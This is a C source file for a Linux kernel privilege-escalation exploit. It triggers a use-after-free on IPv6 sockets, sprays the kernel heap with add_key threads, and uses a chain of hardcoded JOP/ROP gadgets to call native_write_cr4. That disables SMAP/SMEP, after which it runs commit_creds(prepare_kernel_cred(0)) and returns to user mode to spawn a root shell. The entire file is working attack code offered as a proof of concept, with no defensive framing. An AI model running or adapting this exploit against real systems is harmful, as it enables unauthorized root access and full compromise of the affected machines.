/*
 * SMAP bypass exploit by invoking native_write_cr4 with JOP, needs improvement in terms of success ratio
 * author: ww9210
 */

/* 
#######   CREDITS  ############
Mohamed Ghannam
*/
 
/*This poc has been tested on my custom kernel reseach in ubuntu 4.10.5, the same thing applies to other versions
 * if you don't see RIP control, that means file_security_alloc is not called, so we should look for other similar object
 * */
#define _GNU_SOURCE
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <netinet/in.h>
#include <unistd.h>
#include <pthread.h>
#include <sys/mman.h>
 
#define SMAP_SMEP_BYPASS 1
#define PAD_NUM 3
#define THREADS_NUM 2400
#define SOL_DCCP 269
#define COMMIT_CREDS		0xffffffff8107b2e0
#define PREPARE_KERNEL_CRED	0xffffffff8107b690
unsigned long  gadget = 0xffffffff816b3d05; // mov byte ptr [rcx], 0 ; ret
unsigned long gadget2 = 0xffffffff8147d853; // sar dword ptr [rcx], 0x41 ; ret
unsigned long gadget3 = 0xffffffff816911fd; // movzx edi, al ; call rcx
unsigned long gadget4 = 0xffffffff8116215b; // mov edi, esi ; call rcx
#define native_write_cr4 0xffffffff81048ac4//native_write_rc4+1
unsigned long kfree = 0xffffffff81187670; //kfree
unsigned long gadget5 = 0xffffffff8130bf70;// mov qword ptr [rdi], rcx ; ret
unsigned long gadget6 = 0xffffffff81f8d685;// mov rdi, qword ptr [rdi] ; mov esi, dword ptr [rdx + 1] ; call rcx
unsigned long gadget7 = 0xffffffff810b4a6e;// mov qword ptr [rcx], 0 ; ret
unsigned long gadget8 = 0xffffffff816304e6;// mov qword ptr [rcx], rdi ; xor eax, eax ; ret
unsigned long gadget9 = 0xffffffff810ba927;// mov eax, edi ; ret
unsigned long gadget10 = 0xffffffff8155485d;// mov edi, dword ptr [rdi + 8] ; add r15, 0x18 ; xor edx, edx ; mov rsi, rbx ; call rcx
unsigned long gadget11 = 0xffffffff813527c9; // push rdi ; or al, 0x48 ; mov dword ptr [rdi], esi ; mov rbp, rsp ; mov dword ptr [rdi + 8], ecx ; pop rbp ; ret
 
#define poprdiret 0xffffffff810b2747
#define swapgs 0xffffffff81048b84
#define iretq 0xffffffff81021cf6
#define stack_pivot_gadget 0xffffffff816dc1e8
#define stack_top_offset 0
#define krop_base_to_map 0x816dc000
int rop_start= 0x1e8;
void* krop_base_mapped;

unsigned long user_cs, user_ss, user_rflags;

static void save_state()
{
    asm(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq\n"
        "popq %2\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags)
        :
        : "memory");
}

void exec_shell() {
	char *shell = "/bin/bash";
	char *args[] = {shell, "-i", NULL};
	execve(shell, args, NULL);
}

typedef int __attribute__((regparm(3))) (* _commit_creds)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3))) (* _prepare_kernel_cred)(unsigned long cred);

_commit_creds commit_creds = (_commit_creds)COMMIT_CREDS;
_prepare_kernel_cred prepare_kernel_cred = (_prepare_kernel_cred)PREPARE_KERNEL_CRED;
void get_root_payload(void) {
		commit_creds(prepare_kernel_cred(0));
}


int fd1,fd2;
struct sockaddr_in6 in1,in2;
 
char *addr;
void padding()
{
	int fd[PAD_NUM];
	int i;
	for(i=0;i<PAD_NUM;i++){
		fd[i] = socket(0xa,6,0);
	}
}
volatile int do_spray=1;
void *kmalloc()
{
	while(do_spray){
		syscall(__NR_add_key, "user", "wtf", addr, 16, -2);
	}
}
void spray()
{
	pthread_t th[THREADS_NUM];
	int i;
	for(i=0;i<THREADS_NUM;i++)
	if(pthread_create(&th[i], NULL, kmalloc, (void*) NULL) != 0){
		fprintf(stderr, "couldn't thread create\n");
		system("echo ww9210_thread_create_fail > /dev/kmsg");
		exit(1);
	}
}
int do_uaf()
{
    struct sockaddr_in6 cin1,cin2;
	int ret;
 
	spray();
	usleep(200000);
    fd1 = socket(0xa,6,0);
	if(fd1<0){
		perror("socket");
	}
 
    memset(&in1,0,sizeof(in1));
    in1.sin6_family = AF_INET6;
    in1.sin6_addr = in6addr_loopback;
    in1.sin6_port = 0x214e;//htons(0x1000);
    ret=bind(fd1,(struct sockaddr*)&in1,sizeof(in1));
	if(ret<0){
		perror("bind");
	}
 
    ret=bind(fd1,(struct sockaddr*)&in1,sizeof(in1));
    ret=listen(fd1,0x1);
	if(ret<0){
		perror("listen");
	}
 
    fd2 = socket(0xa,6,0);
	if(fd2<0){
		perror("socket");
	}
 
    memset(&cin1,0,sizeof(cin1));
    cin1.sin6_family = AF_INET6;
    cin1.sin6_addr = in6addr_loopback;
    cin1.sin6_port = 0x214e;//htons(0x1000);
    cin1.sin6_flowinfo = 0;
    ret=connect(fd2,(struct sockaddr*)&cin1,sizeof(cin1));
	if(fd2<0){
		perror("socket");
	}

 
    memset(&cin2,0,sizeof(cin2));
    ret=connect(fd1,(struct sockaddr*)&cin2,sizeof(cin2));
	if(ret<0){
		perror("connect");
	}
    memset(&in2,0,sizeof(in2));
 
    in2.sin6_family = AF_INET6;
    in2.sin6_addr = in6addr_loopback;
    //in2.sin6_port = htons(0x2000);
    in2.sin6_port = htons(0x6f0);
    in2.sin6_flowinfo = 0x2;
    in2.sin6_scope_id = 6;
    ret=bind(fd2,(struct sockaddr*)&in2,sizeof(in2));
	if(ret<0){
		perror("bind");
	}
 
    struct sockaddr_in6 cin3;
    memset(&cin3,0,sizeof(cin3));
    ret=connect(fd2,(struct sockaddr*)&cin3,sizeof(cin3));
	if(ret<0){
		perror("connect");
	}

 
    ret=listen(fd2,0xb1);
	if(ret<0){
		perror("listen");
	}
 
    struct sockaddr_in6 cin4;
    memset(&cin4,0,sizeof(cin4));
    cin4.sin6_family = AF_INET6;
    //cin4.sin6_port = htons(0x2000);//htons(0x3000);
    cin4.sin6_port = htons(0x6f0);//htons(0x3000);
    memset(&cin4.sin6_addr,0,sizeof(struct in6_addr));
    cin4.sin6_flowinfo = 1;
    cin4.sin6_scope_id = 0x32f1;
    ret=connect(fd1,(struct sockaddr*)&cin4,sizeof(cin4));
	if(ret<0){
		perror("connect");
	}
    return fd2;
}
 
void * alloc_umem(void *addr,size_t size)
{
 
    addr = mmap((void*)0x100000000,4096,PROT_READ | PROT_WRITE | PROT_EXEC,MAP_SHARED|MAP_ANONYMOUS,-1,0);
    if(addr == (char *)-1) {
        perror("mmap");
        return NULL;
    }
    return addr;
}

void get_shell()
{
	do_spray=0;
	puts("win!");
	system("echo ww9210_win > /dev/kmsg");
	sleep(1);
	pid_t pid;
	//pid =fork();
	//if(pid==0){
    	char *shell = "/bin/sh";
    	char *args[] = {shell, NULL};
    	execve(shell, args, NULL);
	//}
	//else{
		//pause();
	//}
}
unsigned long rop_chain[] = {
    //poprdiret,
    //0x6f0,
    //native_write_cr4,
    (unsigned long)&get_root_payload,
    swapgs,
    0, //dummy
    iretq,
    (unsigned long)&get_shell,
    0,//user_cs,
    0,//user_rflags,
    0,//krop_base_mapped + 0x4000,
    0//user_ss
};
void prepare_krop(){
    krop_base_mapped=mmap((void *)krop_base_to_map-0x1000,0x8000,PROT_READ|PROT_WRITE,MAP_PRIVATE|MAP_ANONYMOUS,-1,0);
    if (krop_base_mapped<0){
        perror("mmap failed");
    }

	memset(krop_base_mapped,'\xc3',0x8000);
	rop_chain[5]=user_cs;
	rop_chain[6]=user_rflags;
	rop_chain[7]=(unsigned long)krop_base_mapped + 0x4000;
	rop_chain[8]=user_ss;

    memcpy(krop_base_to_map+rop_start, rop_chain, sizeof(rop_chain));
    puts("rop_payload_initialized");
}
int main(void)
{
 
    addr = (char *)alloc_umem((void*)0x100000000,4096);
    if(addr == NULL)
        exit(0);
    memset(addr,0xcc,4096);

	save_state();
	prepare_krop();

	//*(unsigned long*)addr    = 0x4142434445464748;
	*(unsigned long*)addr = stack_pivot_gadget;
#ifdef SMAP_SMEP_BYPASS
	*(unsigned long*)addr = gadget;
	*(unsigned long*)addr = gadget2;
	*(unsigned long*)addr = gadget11;
#endif
	//*(unsigned long*)addr    = gadget5;
	//*(unsigned long*)addr    = kfree;
	//*(unsigned long*)addr    = gadget4;
	
	*(unsigned long*)(addr+8)= (unsigned long)&get_root_payload;
	*(unsigned long*)(addr+8)= (unsigned long)stack_pivot_gadget;
	*(unsigned long*)(addr+8)= (unsigned long)41424244;
    *(unsigned long *)(addr + 0x79) = 0xdeadbeef; /* RIP control */
	int j;
	for(j=0;j<200;j++)
	{
		*(unsigned long*)((unsigned long)addr+0x100+j*8) = stack_pivot_gadget;
	}
 
	int t  = *(int*)&get_root_payload;
	padding();
	int val = 0x4142;
	socklen_t l=sizeof(val);
	int err=0;
    do_uaf();
#ifdef SMAP_SMEP_BYPASS
	err = getsockopt(fd2, SOL_DCCP, 128, (void*)0x6f0, &l);
	int sk = socket(AF_INET,SOCK_STREAM,0);
	*(unsigned long*)addr    = gadget10;
	sleep(1);
	close(sk);
	err=getsockopt(fd2, SOL_DCCP, 129, (void*)native_write_cr4, &l);
	sk = socket(AF_INET,SOCK_STREAM,0);
	*(unsigned long *)addr = (unsigned long)(addr+0x100);
	usleep(400000);
	close(sk);
#endif
	
	do_spray=0;
	puts("shell...please");
	sleep(4);
	sleep(2);
	pause();
    return 0;
}

